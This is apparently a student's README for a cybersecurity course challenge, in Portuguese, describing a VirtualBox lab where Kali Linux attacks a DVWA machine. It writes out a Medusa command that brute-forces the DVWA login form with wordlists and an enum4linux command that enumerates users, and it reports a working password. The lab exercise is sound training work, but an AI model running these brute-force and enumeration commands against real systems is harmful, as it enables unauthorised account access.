# desafio-brutforce
Repositório do desafio do curso de Cybersecurity da DIO no tema brutforce

Montei 2 VMS uma com Kali Linux 2025.3 com o IP 10.0.2.2 e uma VM com o DVWA com o IP 10.0.2.4 utilizando o virtualbox. Logo apos utilizei o software Medusa para dentro do Kali Linux para fazer um ataque de brutforce a formulario utilizando arquiv:os user.txt e pass.txt como listas respectivamente de usuario e senha utilizando o seguinte comando:

#medusa -h 10.0.2.4 -U users.txt -P pass.txt -M http \
-m PAGE: '/dvwa/login.php' \
-m FORM: 'username=^USER^&password=^PASS^&login=Login' \
-m 'FAIL =Login failed' -t 6

O resultado obtido está na pasta imagens e houve sucesso na conexão.

Logo após utilizei a tecnica spraing para descobrir os usuários do sistema e tentar logar com os usuários descobertos, para isso utilizei o seguinte comando:

#enum4linux -a 10.0.2.4 | tee enum4.output.txt
que mostrou diversas informações do sistema, inclusive uma lista de usuários na qual tentei conectar e consegui utilizando usuário user e senha password123.

Uma parte da saida do comando pode ser vista na pasta imagens.
